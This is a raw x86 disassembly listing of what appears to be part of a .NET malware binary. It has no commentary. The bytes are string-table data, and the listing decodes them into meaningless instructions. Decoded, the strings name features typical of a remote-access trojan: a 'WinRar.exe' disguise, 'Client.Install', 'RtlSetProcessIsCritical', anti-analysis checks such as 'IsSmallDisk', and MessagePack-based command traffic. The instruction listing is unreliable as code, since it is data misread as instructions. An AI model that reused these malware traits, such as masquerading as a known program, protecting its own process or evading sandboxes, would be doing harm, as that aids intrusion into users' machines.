  4081fd:	62 65 72             	bound  %esp,0x72(%ebp)
  408200:	41                   	inc    %ecx
  408201:	74 74                	je     0x408277
  408203:	72 69                	jb     0x40826e
  408205:	62 75 74             	bound  %esi,0x74(%ebp)
  408208:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  40820c:	6d                   	insl   (%dx),%es:(%edi)
  40820d:	70 69                	jo     0x408278
  40820f:	6c                   	insb   (%dx),%es:(%edi)
  408210:	61                   	popa
  408211:	74 69                	je     0x40827c
  408213:	6f                   	outsl  %ds:(%esi),(%dx)
  408214:	6e                   	outsb  %ds:(%esi),(%dx)
  408215:	52                   	push   %edx
  408216:	65 6c                	gs insb (%dx),%es:(%edi)
  408218:	61                   	popa
  408219:	78 61                	js     0x40827c
  40821b:	74 69                	je     0x408286
  40821d:	6f                   	outsl  %ds:(%esi),(%dx)
  40821e:	6e                   	outsb  %ds:(%esi),(%dx)
  40821f:	73 41                	jae    0x408262
  408221:	74 74                	je     0x408297
  408223:	72 69                	jb     0x40828e
  408225:	62 75 74             	bound  %esi,0x74(%ebp)
  408228:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40822c:	73 65                	jae    0x408293
  40822e:	6d                   	insl   (%dx),%es:(%edi)
  40822f:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  408233:	72 6f                	jb     0x4082a4
  408235:	64 75 63             	fs jne 0x40829b
  408238:	74 41                	je     0x40827b
  40823a:	74 74                	je     0x4082b0
  40823c:	72 69                	jb     0x4082a7
  40823e:	62 75 74             	bound  %esi,0x74(%ebp)
  408241:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408245:	73 65                	jae    0x4082ac
  408247:	6d                   	insl   (%dx),%es:(%edi)
  408248:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  40824c:	6f                   	outsl  %ds:(%esi),(%dx)
  40824d:	70 79                	jo     0x4082c8
  40824f:	72 69                	jb     0x4082ba
  408251:	67 68 74 41 74 74    	addr16 push $0x74744174
  408257:	72 69                	jb     0x4082c2
  408259:	62 75 74             	bound  %esi,0x74(%ebp)
  40825c:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408260:	73 65                	jae    0x4082c7
  408262:	6d                   	insl   (%dx),%es:(%edi)
  408263:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  408267:	6f                   	outsl  %ds:(%esi),(%dx)
  408268:	6d                   	insl   (%dx),%es:(%edi)
  408269:	70 61                	jo     0x4082cc
  40826b:	6e                   	outsb  %ds:(%esi),(%dx)
  40826c:	79 41                	jns    0x4082af
  40826e:	74 74                	je     0x4082e4
  408270:	72 69                	jb     0x4082db
  408272:	62 75 74             	bound  %esi,0x74(%ebp)
  408275:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  408279:	6e                   	outsb  %ds:(%esi),(%dx)
  40827a:	74 69                	je     0x4082e5
  40827c:	6d                   	insl   (%dx),%es:(%edi)
  40827d:	65 43                	gs inc %ebx
  40827f:	6f                   	outsl  %ds:(%esi),(%dx)
  408280:	6d                   	insl   (%dx),%es:(%edi)
  408281:	70 61                	jo     0x4082e4
  408283:	74 69                	je     0x4082ee
  408285:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  408288:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  40828f:	69 
  408290:	62 75 74             	bound  %esi,0x74(%ebp)
  408293:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  408297:	74 5f                	je     0x4082f8
  408299:	55                   	push   %ebp
  40829a:	73 65                	jae    0x408301
  40829c:	53                   	push   %ebx
  40829d:	68 65 6c 6c 45       	push   $0x456c6c65
  4082a2:	78 65                	js     0x408309
  4082a4:	63 75 74             	arpl   %esi,0x74(%ebp)
  4082a7:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  4082ab:	61                   	popa
  4082ac:	64 42                	fs inc %edx
  4082ae:	79 74                	jns    0x408324
  4082b0:	65 00 57 72          	add    %dl,%gs:0x72(%edi)
  4082b4:	69 74 65 42 79 74 65 	imul   $0x657479,0x42(%ebp,%eiz,2),%esi
  4082bb:	00 
  4082bc:	44                   	inc    %esp
  4082bd:	65 6c                	gs insb (%dx),%es:(%edi)
  4082bf:	65 74 65             	gs je  0x408327
  4082c2:	56                   	push   %esi
  4082c3:	61                   	popa
  4082c4:	6c                   	insb   (%dx),%es:(%edi)
  4082c5:	75 65                	jne    0x40832c
  4082c7:	00 69 6e             	add    %ch,0x6e(%ecx)
  4082ca:	6e                   	outsb  %ds:(%esi),(%dx)
  4082cb:	65 72 56             	gs jb  0x408324
  4082ce:	61                   	popa
  4082cf:	6c                   	insb   (%dx),%es:(%edi)
  4082d0:	75 65                	jne    0x408337
  4082d2:	00 47 65             	add    %al,0x65(%edi)
  4082d5:	74 56                	je     0x40832d
  4082d7:	61                   	popa
  4082d8:	6c                   	insb   (%dx),%es:(%edi)
  4082d9:	75 65                	jne    0x408340
  4082db:	00 53 65             	add    %dl,0x65(%ebx)
  4082de:	74 56                	je     0x408336
  4082e0:	61                   	popa
  4082e1:	6c                   	insb   (%dx),%es:(%edi)
  4082e2:	75 65                	jne    0x408349
  4082e4:	00 76 61             	add    %dh,0x61(%esi)
  4082e7:	6c                   	insb   (%dx),%es:(%edi)
  4082e8:	75 65                	jne    0x40834f
  4082ea:	00 67 65             	add    %ah,0x65(%edi)
  4082ed:	74 5f                	je     0x40834e
  4082ef:	4b                   	dec    %ebx
  4082f0:	65 65 70 41          	gs gs jo 0x408335
  4082f4:	6c                   	insb   (%dx),%es:(%edi)
  4082f5:	69 76 65 00 73 65 74 	imul   $0x74657300,0x65(%esi),%esi
  4082fc:	5f                   	pop    %edi
  4082fd:	4b                   	dec    %ebx
  4082fe:	65 65 70 41          	gs gs jo 0x408343
  408302:	6c                   	insb   (%dx),%es:(%edi)
  408303:	69 76 65 00 52 65 6d 	imul   $0x6d655200,0x65(%esi),%esi
  40830a:	6f                   	outsl  %ds:(%esi),(%dx)
  40830b:	76 65                	jbe    0x408372
  40830d:	00 57 69             	add    %dl,0x69(%edi)
  408310:	6e                   	outsb  %ds:(%esi),(%dx)
  408311:	52                   	push   %edx
  408312:	61                   	popa
  408313:	72 2e                	jb     0x408343
  408315:	65 78 65             	gs js  0x40837d
  408318:	00 73 65             	add    %dh,0x65(%ebx)
  40831b:	74 5f                	je     0x40837c
  40831d:	42                   	inc    %edx
  40831e:	6c                   	insb   (%dx),%es:(%edi)
  40831f:	6f                   	outsl  %ds:(%esi),(%dx)
  408320:	63 6b 53             	arpl   %ebp,0x53(%ebx)
  408323:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  40832a:	5f                   	pop    %edi
  40832b:	54                   	push   %esp
  40832c:	6f                   	outsl  %ds:(%esi),(%dx)
  40832d:	74 61                	je     0x408390
  40832f:	6c                   	insb   (%dx),%es:(%edi)
  408330:	53                   	push   %ebx
  408331:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  408338:	5f                   	pop    %edi
  408339:	48                   	dec    %eax
  40833a:	65 61                	gs popa
  40833c:	64 65 72 53          	fs gs jb 0x408393
  408340:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408347:	5f                   	pop    %edi
  408348:	48                   	dec    %eax
  408349:	65 61                	gs popa
  40834b:	64 65 72 53          	fs gs jb 0x4083a2
  40834f:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408356:	5f                   	pop    %edi
  408357:	53                   	push   %ebx
  408358:	65 6e                	outsb  %gs:(%esi),(%dx)
  40835a:	64 42                	fs inc %edx
  40835c:	75 66                	jne    0x4083c4
  40835e:	66 65 72 53          	data16 gs jb 0x4083b5
  408362:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408369:	5f                   	pop    %edi
  40836a:	52                   	push   %edx
  40836b:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  40836f:	76 65                	jbe    0x4083d6
  408371:	42                   	inc    %edx
  408372:	75 66                	jne    0x4083da
  408374:	66 65 72 53          	data16 gs jb 0x4083cb
  408378:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  40837f:	5f                   	pop    %edi
  408380:	4b                   	dec    %ebx
  408381:	65 79 53             	gs jns 0x4083d7
  408384:	69 7a 65 00 49 6e 64 	imul   $0x646e4900,0x65(%edx),%edi
  40838b:	65 78 4f             	gs js  0x4083dd
  40838e:	66 00 73 74          	data16 add %dh,0x74(%ebx)
  408392:	72 46                	jb     0x4083da
  408394:	6c                   	insb   (%dx),%es:(%edi)
  408395:	61                   	popa
  408396:	67 00 43 72          	add    %al,0x72(%bp,%di)
  40839a:	79 70                	jns    0x40840c
  40839c:	74 6f                	je     0x40840d
  40839e:	43                   	inc    %ebx
  40839f:	6f                   	outsl  %ds:(%esi),(%dx)
  4083a0:	6e                   	outsb  %ds:(%esi),(%dx)
  4083a1:	66 69 67 00 67 65    	imul   $0x6567,0x0(%edi),%sp
  4083a7:	74 5f                	je     0x408408
  4083a9:	50                   	push   %eax
  4083aa:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  4083b1:	5f                   	pop    %edi
  4083b2:	50                   	push   %eax
  4083b3:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  4083ba:	74 65                	je     0x408421
  4083bc:	6d                   	insl   (%dx),%es:(%edi)
  4083bd:	2e 54                	cs push %esp
  4083bf:	68 72 65 61 64       	push   $0x64616572
  4083c4:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  4083cb:	5f                   	pop    %edi
  4083cc:	50                   	push   %eax
  4083cd:	61                   	popa
  4083ce:	64 64 69 6e 67 00 61 	fs imul $0x64646100,%fs:0x67(%esi),%ebp
  4083d5:	64 64 
  4083d7:	5f                   	pop    %edi
  4083d8:	53                   	push   %ebx
  4083d9:	65 73 73             	gs jae 0x40844f
  4083dc:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  4083e3:	6e                   	outsb  %ds:(%esi),(%dx)
  4083e4:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  4083e8:	73 74                	jae    0x40845e
  4083ea:	65 6d                	gs insl (%dx),%es:(%edi)
  4083ec:	45                   	inc    %ebp
  4083ed:	76 65                	jbe    0x408454
  4083ef:	6e                   	outsb  %ds:(%esi),(%dx)
  4083f0:	74 73                	je     0x408465
  4083f2:	5f                   	pop    %edi
  4083f3:	53                   	push   %ebx
  4083f4:	65 73 73             	gs jae 0x40846a
  4083f7:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  4083fe:	6e                   	outsb  %ds:(%esi),(%dx)
  4083ff:	67 00 55 54          	add    %dl,0x54(%di)
  408403:	46                   	inc    %esi
  408404:	38 45 6e             	cmp    %al,0x6e(%ebp)
  408407:	63 6f 64             	arpl   %ebp,0x64(%edi)
  40840a:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  408411:	74 65                	je     0x408478
  408413:	6d                   	insl   (%dx),%es:(%edi)
  408414:	2e 44                	cs inc %esp
  408416:	72 61                	jb     0x408479
  408418:	77 69                	ja     0x408483
  40841a:	6e                   	outsb  %ds:(%esi),(%dx)
  40841b:	67 2e 49             	addr16 cs dec %ecx
  40841e:	6d                   	insl   (%dx),%es:(%edi)
  40841f:	61                   	popa
  408420:	67 69 6e 67 00 53 79 	imul   $0x73795300,0x67(%bp),%ebp
  408427:	73 
  408428:	74 65                	je     0x40848f
  40842a:	6d                   	insl   (%dx),%es:(%edi)
  40842b:	2e 52                	cs push %edx
  40842d:	75 6e                	jne    0x40849d
  40842f:	74 69                	je     0x40849a
  408431:	6d                   	insl   (%dx),%es:(%edi)
  408432:	65 2e 56             	gs cs push %esi
  408435:	65 72 73             	gs jb  0x4084ab
  408438:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  40843f:	46                   	inc    %esi
  408440:	72 6f                	jb     0x4084b1
  408442:	6d                   	insl   (%dx),%es:(%edi)
  408443:	42                   	inc    %edx
  408444:	61                   	popa
  408445:	73 65                	jae    0x4084ac
  408447:	36 34 53             	ss xor $0x53,%al
  40844a:	74 72                	je     0x4084be
  40844c:	69 6e 67 00 54 6f 42 	imul   $0x426f5400,0x67(%esi),%ebp
  408453:	61                   	popa
  408454:	73 65                	jae    0x4084bb
  408456:	36 34 53             	ss xor $0x53,%al
  408459:	74 72                	je     0x4084cd
  40845b:	69 6e 67 00 52 65 61 	imul   $0x61655200,0x67(%esi),%ebp
  408462:	64 53                	fs push %ebx
  408464:	74 72                	je     0x4084d8
  408466:	69 6e 67 00 44 6f 77 	imul   $0x776f4400,0x67(%esi),%ebp
  40846d:	6e                   	outsb  %ds:(%esi),(%dx)
  40846e:	6c                   	insb   (%dx),%es:(%edi)
  40846f:	6f                   	outsl  %ds:(%esi),(%dx)
  408470:	61                   	popa
  408471:	64 53                	fs push %ebx
  408473:	74 72                	je     0x4084e7
  408475:	69 6e 67 00 57 72 69 	imul   $0x69725700,0x67(%esi),%ebp
  40847c:	74 65                	je     0x4084e3
  40847e:	53                   	push   %ebx
  40847f:	74 72                	je     0x4084f3
  408481:	69 6e 67 00 54 6f 53 	imul   $0x536f5400,0x67(%esi),%ebp
  408488:	74 72                	je     0x4084fc
  40848a:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  408491:	5f                   	pop    %edi
  408492:	41                   	inc    %ecx
  408493:	73 53                	jae    0x4084e8
  408495:	74 72                	je     0x408509
  408497:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  40849e:	5f                   	pop    %edi
  40849f:	41                   	inc    %ecx
  4084a0:	73 53                	jae    0x4084f5
  4084a2:	74 72                	je     0x408516
  4084a4:	69 6e 67 00 42 79 74 	imul   $0x74794200,0x67(%esi),%ebp
  4084ab:	65 73 41             	gs jae 0x4084ef
  4084ae:	73 53                	jae    0x408503
  4084b0:	74 72                	je     0x408524
  4084b2:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
  4084b9:	41                   	inc    %ecx
  4084ba:	73 53                	jae    0x40850f
  4084bc:	74 72                	je     0x408530
  4084be:	69 6e 67 00 53 65 74 	imul   $0x74655300,0x67(%esi),%ebp
  4084c5:	41                   	inc    %ecx
  4084c6:	73 53                	jae    0x40851b
  4084c8:	74 72                	je     0x40853c
  4084ca:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
  4084d1:	53                   	push   %ebx
  4084d2:	74 72                	je     0x408546
  4084d4:	69 6e 67 00 42 79 74 	imul   $0x74794200,0x67(%esi),%ebp
  4084db:	65 73 41             	gs jae 0x40851f
  4084de:	73 48                	jae    0x408528
  4084e0:	65 78 53             	gs js  0x408536
  4084e3:	74 72                	je     0x408557
  4084e5:	69 6e 67 00 53 75 62 	imul   $0x62755300,0x67(%esi),%ebp
  4084ec:	73 74                	jae    0x408562
  4084ee:	72 69                	jb     0x408559
  4084f0:	6e                   	outsb  %ds:(%esi),(%dx)
  4084f1:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  4084f5:	73 74                	jae    0x40856b
  4084f7:	65 6d                	gs insl (%dx),%es:(%edi)
  4084f9:	2e 44                	cs inc %esp
  4084fb:	72 61                	jb     0x40855e
  4084fd:	77 69                	ja     0x408568
  4084ff:	6e                   	outsb  %ds:(%esi),(%dx)
  408500:	67 00 67 65          	add    %ah,0x65(%bx)
  408504:	74 5f                	je     0x408565
  408506:	41                   	inc    %ecx
  408507:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  40850b:	61                   	popa
  40850c:	74 65                	je     0x408573
  40850e:	50                   	push   %eax
  40850f:	6f                   	outsl  %ds:(%esi),(%dx)
  408510:	6e                   	outsb  %ds:(%esi),(%dx)
  408511:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  408515:	74 5f                	je     0x408576
  408517:	41                   	inc    %ecx
  408518:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  40851c:	61                   	popa
  40851d:	74 65                	je     0x408584
  40851f:	50                   	push   %eax
  408520:	6f                   	outsl  %ds:(%esi),(%dx)
  408521:	6e                   	outsb  %ds:(%esi),(%dx)
  408522:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  408526:	74 5f                	je     0x408587
  408528:	45                   	inc    %ebp
  408529:	72 72                	jb     0x40859d
  40852b:	6f                   	outsl  %ds:(%esi),(%dx)
  40852c:	72 44                	jb     0x408572
  40852e:	69 61 6c 6f 67 00 6d 	imul   $0x6d00676f,0x6c(%ecx),%esp
  408535:	73 67                	jae    0x40859e
  408537:	00 43 6f             	add    %al,0x6f(%ebx)
  40853a:	6d                   	insl   (%dx),%es:(%edi)
  40853b:	70 75                	jo     0x4085b2
  40853d:	74 65                	je     0x4085a4
  40853f:	48                   	dec    %eax
  408540:	61                   	popa
  408541:	73 68                	jae    0x4085ab
  408543:	00 73 74             	add    %dh,0x74(%ebx)
  408546:	72 54                	jb     0x40859c
  408548:	6f                   	outsl  %ds:(%esi),(%dx)
  408549:	48                   	dec    %eax
  40854a:	61                   	popa
  40854b:	73 68                	jae    0x4085b5
  40854d:	00 47 65             	add    %al,0x65(%edi)
  408550:	74 48                	je     0x40859a
  408552:	61                   	popa
  408553:	73 68                	jae    0x4085bd
  408555:	00 56 65             	add    %dl,0x65(%esi)
  408558:	72 69                	jb     0x4085c3
  40855a:	66 79 48             	data16 jns 0x4085a5
  40855d:	61                   	popa
  40855e:	73 68                	jae    0x4085c8
  408560:	00 46 6c             	add    %al,0x6c(%esi)
  408563:	75 73                	jne    0x4085d8
  408565:	68 00 67 65 74       	push   $0x74656700
  40856a:	5f                   	pop    %edi
  40856b:	45                   	inc    %ebp
  40856c:	78 65                	js     0x4085d3
  40856e:	63 75 74             	arpl   %esi,0x74(%ebp)
  408571:	61                   	popa
  408572:	62 6c 65 50          	bound  %ebp,0x50(%ebp,%eiz,2)
  408576:	61                   	popa
  408577:	74 68                	je     0x4085e1
  408579:	00 47 65             	add    %al,0x65(%edi)
  40857c:	74 54                	je     0x4085d2
  40857e:	65 6d                	gs insl (%dx),%es:(%edi)
  408580:	70 50                	jo     0x4085d2
  408582:	61                   	popa
  408583:	74 68                	je     0x4085ed
  408585:	00 70 61             	add    %dh,0x61(%eax)
  408588:	74 68                	je     0x4085f2
  40858a:	00 48 6d             	add    %cl,0x6d(%eax)
  40858d:	61                   	popa
  40858e:	63 53 68             	arpl   %edx,0x68(%ebx)
  408591:	61                   	popa
  408592:	32 35 36 4c 65 6e    	xor    0x6e654c36,%dh
  408598:	67 74 68             	addr16 je 0x408603
  40859b:	00 67 65             	add    %ah,0x65(%edi)
  40859e:	74 5f                	je     0x4085ff
  4085a0:	4c                   	dec    %esp
  4085a1:	65 6e                	outsb  %gs:(%esi),(%dx)
  4085a3:	67 74 68             	addr16 je 0x40860e
  4085a6:	00 49 76             	add    %cl,0x76(%ecx)
  4085a9:	4c                   	dec    %esp
  4085aa:	65 6e                	outsb  %gs:(%esi),(%dx)
  4085ac:	67 74 68             	addr16 je 0x408617
  4085af:	00 41 75             	add    %al,0x75(%ecx)
  4085b2:	74 68                	je     0x40861c
  4085b4:	4b                   	dec    %ebx
  4085b5:	65 79 4c             	gs jns 0x408604
  4085b8:	65 6e                	outsb  %gs:(%esi),(%dx)
  4085ba:	67 74 68             	addr16 je 0x408625
  4085bd:	00 55 72             	add    %dl,0x72(%ebp)
  4085c0:	69 00 41 6e 74 69    	imul   $0x69746e41,(%eax),%eax
  4085c6:	00 6d 73             	add    %ch,0x73(%ebp)
  4085c9:	67 70 61             	addr16 jo 0x40862d
  4085cc:	63 6b 4f             	arpl   %ebp,0x4f(%ebx)
  4085cf:	62 6a 00             	bound  %ebp,0x0(%edx)
  4085d2:	6c                   	insb   (%dx),%es:(%edi)
  4085d3:	69 73 74 4f 62 6a 00 	imul   $0x6a624f,0x74(%ebx),%esi
  4085da:	6f                   	outsl  %ds:(%esi),(%dx)
  4085db:	62 6a 00             	bound  %ebp,0x0(%edx)
  4085de:	4d                   	dec    %ebp
  4085df:	65 73 73             	gs jae 0x408655
  4085e2:	61                   	popa
  4085e3:	67 65 50             	addr16 gs push %eax
  4085e6:	61                   	popa
  4085e7:	63 6b 4c             	arpl   %ebp,0x4c(%ebx)
  4085ea:	69 62 2e 4d 65 73 73 	imul   $0x7373654d,0x2e(%edx),%esp
  4085f1:	61                   	popa
  4085f2:	67 65 50             	addr16 gs push %eax
  4085f5:	61                   	popa
  4085f6:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  4085f9:	4d                   	dec    %ebp
  4085fa:	73 67                	jae    0x408663
  4085fc:	50                   	push   %eax
  4085fd:	61                   	popa
  4085fe:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  408601:	41                   	inc    %ecx
  408602:	73 79                	jae    0x40867d
  408604:	6e                   	outsb  %ds:(%esi),(%dx)
  408605:	63 43 61             	arpl   %eax,0x61(%ebx)
  408608:	6c                   	insb   (%dx),%es:(%edi)
  408609:	6c                   	insb   (%dx),%es:(%edi)
  40860a:	62 61 63             	bound  %esp,0x63(%ecx)
  40860d:	6b 00 52             	imul   $0x52,(%eax),%eax
  408610:	65 6d                	gs insl (%dx),%es:(%edi)
  408612:	6f                   	outsl  %ds:(%esi),(%dx)
  408613:	74 65                	je     0x40867a
  408615:	43                   	inc    %ebx
  408616:	65 72 74             	gs jb  0x40868d
  408619:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  408620:	56                   	push   %esi
  408621:	61                   	popa
  408622:	6c                   	insb   (%dx),%es:(%edi)
  408623:	69 64 61 74 69 6f 6e 	imul   $0x436e6f69,0x74(%ecx,%eiz,2),%esp
  40862a:	43 
  40862b:	61                   	popa
  40862c:	6c                   	insb   (%dx),%es:(%edi)
  40862d:	6c                   	insb   (%dx),%es:(%edi)
  40862e:	62 61 63             	bound  %esp,0x63(%ecx)
  408631:	6b 00 54             	imul   $0x54,(%eax),%eax
  408634:	69 6d 65 72 43 61 6c 	imul   $0x6c614372,0x65(%ebp),%ebp
  40863b:	6c                   	insb   (%dx),%es:(%edi)
  40863c:	62 61 63             	bound  %esp,0x63(%ecx)
  40863f:	6b 00 75             	imul   $0x75,(%eax),%eax
  408642:	6e                   	outsb  %ds:(%esi),(%dx)
  408643:	70 61                	jo     0x4086a6
  408645:	63 6b 5f             	arpl   %ebp,0x5f(%ebx)
  408648:	6d                   	insl   (%dx),%es:(%edi)
  408649:	73 67                	jae    0x4086b2
  40864b:	70 61                	jo     0x4086ae
  40864d:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  408650:	52                   	push   %edx
  408651:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  408658:	4b 65 
  40865a:	79 50                	jns    0x4086ac
  40865c:	65 72 6d             	gs jb  0x4086cc
  40865f:	69 73 73 69 6f 6e 43 	imul   $0x436e6f69,0x73(%ebx),%esi
  408666:	68 65 63 6b 00       	push   $0x6b6365
  40866b:	46                   	inc    %esi
  40866c:	6c                   	insb   (%dx),%es:(%edi)
  40866d:	75 73                	jne    0x4086e2
  40866f:	68 46 69 6e 61       	push   $0x616e6946
  408674:	6c                   	insb   (%dx),%es:(%edi)
  408675:	42                   	inc    %edx
  408676:	6c                   	insb   (%dx),%es:(%edi)
  408677:	6f                   	outsl  %ds:(%esi),(%dx)
  408678:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  40867b:	49                   	dec    %ecx
  40867c:	73 53                	jae    0x4086d1
  40867e:	6d                   	insl   (%dx),%es:(%edi)
  40867f:	61                   	popa
  408680:	6c                   	insb   (%dx),%es:(%edi)
  408681:	6c                   	insb   (%dx),%es:(%edi)
  408682:	44                   	inc    %esp
  408683:	69 73 6b 00 62 56 61 	imul   $0x61566200,0x6b(%ebx),%esi
  40868a:	6c                   	insb   (%dx),%es:(%edi)
  40868b:	00 66 56             	add    %ah,0x56(%esi)
  40868e:	61                   	popa
  40868f:	6c                   	insb   (%dx),%es:(%edi)
  408690:	00 69 56             	add    %ch,0x56(%ecx)
  408693:	61                   	popa
  408694:	6c                   	insb   (%dx),%es:(%edi)
  408695:	00 73 74             	add    %dh,0x74(%ebx)
  408698:	72 56                	jb     0x4086f0
  40869a:	61                   	popa
  40869b:	6c                   	insb   (%dx),%es:(%edi)
  40869c:	00 52 74             	add    %dl,0x74(%edx)
  40869f:	6c                   	insb   (%dx),%es:(%edi)
  4086a0:	53                   	push   %ebx
  4086a1:	65 74 50             	gs je  0x4086f4
  4086a4:	72 6f                	jb     0x408715
  4086a6:	63 65 73             	arpl   %esp,0x73(%ebp)
  4086a9:	73 49                	jae    0x4086f4
  4086ab:	73 43                	jae    0x4086f0
  4086ad:	72 69                	jb     0x408718
  4086af:	74 69                	je     0x40871a
  4086b1:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  4086b4:	00 50 72             	add    %dl,0x72(%eax)
  4086b7:	6f                   	outsl  %ds:(%esi),(%dx)
  4086b8:	63 65 73             	arpl   %esp,0x73(%ebp)
  4086bb:	73 43                	jae    0x408700
  4086bd:	72 69                	jb     0x408728
  4086bf:	74 69                	je     0x40872a
  4086c1:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  4086c4:	00 4e 65             	add    %cl,0x65(%esi)
  4086c7:	74 77                	je     0x408740
  4086c9:	6f                   	outsl  %ds:(%esi),(%dx)
  4086ca:	72 6b                	jb     0x408737
  4086cc:	43                   	inc    %ebx
  4086cd:	72 65                	jb     0x408734
  4086cf:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  4086d2:	74 69                	je     0x40873d
  4086d4:	61                   	popa
  4086d5:	6c                   	insb   (%dx),%es:(%edi)
  4086d6:	00 53 79             	add    %dl,0x79(%ebx)
  4086d9:	73 74                	jae    0x40874f
  4086db:	65 6d                	gs insl (%dx),%es:(%edi)
  4086dd:	2e 53                	cs push %ebx
  4086df:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  4086e3:	69 74 79 2e 50 72 69 	imul   $0x6e697250,0x2e(%ecx,%edi,2),%esi
  4086ea:	6e 
  4086eb:	63 69 70             	arpl   %ebp,0x70(%ecx)
  4086ee:	61                   	popa
  4086ef:	6c                   	insb   (%dx),%es:(%edi)
  4086f0:	00 57 69             	add    %dl,0x69(%edi)
  4086f3:	6e                   	outsb  %ds:(%esi),(%dx)
  4086f4:	64 6f                	outsl  %fs:(%esi),(%dx)
  4086f6:	77 73                	ja     0x40876b
  4086f8:	50                   	push   %eax
  4086f9:	72 69                	jb     0x408764
  4086fb:	6e                   	outsb  %ds:(%esi),(%dx)
  4086fc:	63 69 70             	arpl   %ebp,0x70(%ecx)
  4086ff:	61                   	popa
  408700:	6c                   	insb   (%dx),%es:(%edi)
  408701:	00 41 72             	add    %al,0x72(%ecx)
  408704:	65 45                	gs inc %ebp
  408706:	71 75                	jno    0x40877d
  408708:	61                   	popa
  408709:	6c                   	insb   (%dx),%es:(%edi)
  40870a:	00 67 65             	add    %ah,0x65(%edi)
  40870d:	74 5f                	je     0x40876e
  40870f:	49                   	dec    %ecx
  408710:	6e                   	outsb  %ds:(%esi),(%dx)
  408711:	74 65                	je     0x408778
  408713:	72 76                	jb     0x40878b
  408715:	61                   	popa
  408716:	6c                   	insb   (%dx),%es:(%edi)
  408717:	00 73 65             	add    %dh,0x65(%ebx)
  40871a:	74 5f                	je     0x40877b
  40871c:	49                   	dec    %ecx
  40871d:	6e                   	outsb  %ds:(%esi),(%dx)
  40871e:	74 65                	je     0x408785
  408720:	72 76                	jb     0x408798
  408722:	61                   	popa
  408723:	6c                   	insb   (%dx),%es:(%edi)
  408724:	00 43 6c             	add    %al,0x6c(%ebx)
  408727:	69 65 6e 74 2e 49 6e 	imul   $0x6e492e74,0x6e(%ebp),%esp
  40872e:	73 74                	jae    0x4087a4
  408730:	61                   	popa
  408731:	6c                   	insb   (%dx),%es:(%edi)
  408732:	6c                   	insb   (%dx),%es:(%edi)
  408733:	00 6b 65             	add    %ch,0x65(%ebx)
  408736:	72 6e                	jb     0x4087a6
  408738:	65 6c                	gs insb (%dx),%es:(%edi)
  40873a:	33 32                	xor    (%edx),%esi
  40873c:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  40873f:	6c                   	insb   (%dx),%es:(%edi)
  408740:	00 75 73             	add    %dh,0x73(%ebp)
  408743:	65 72 33             	gs jb  0x408779
  408746:	32 2e                	xor    (%esi),%ch
  408748:	64 6c                	fs insb (%dx),%es:(%edi)
  40874a:	6c                   	insb   (%dx),%es:(%edi)
  40874b:	00 6e 74             	add    %ch,0x74(%esi)
  40874e:	64 6c                	fs insb (%dx),%es:(%edi)
  408750:	6c                   	insb   (%dx),%es:(%edi)
  408751:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  408754:	6c                   	insb   (%dx),%es:(%edi)
  408755:	00 4b 69             	add    %cl,0x69(%ebx)
  408758:	6c                   	insb   (%dx),%es:(%edi)
  408759:	6c                   	insb   (%dx),%es:(%edi)
  40875a:	00 50 6f             	add    %dl,0x6f(%eax)
  40875d:	6c                   	insb   (%dx),%es:(%edi)
  40875e:	6c                   	insb   (%dx),%es:(%edi)
  40875f:	00 57 72             	add    %dl,0x72(%edi)
  408762:	69 74 65 4e 75 6c 6c 	imul   $0x6c6c75,0x4e(%ebp,%eiz,2),%esi
  408769:	00 
  40876a:	53                   	push   %ebx
  40876b:	65 74 41             	gs je  0x4087af
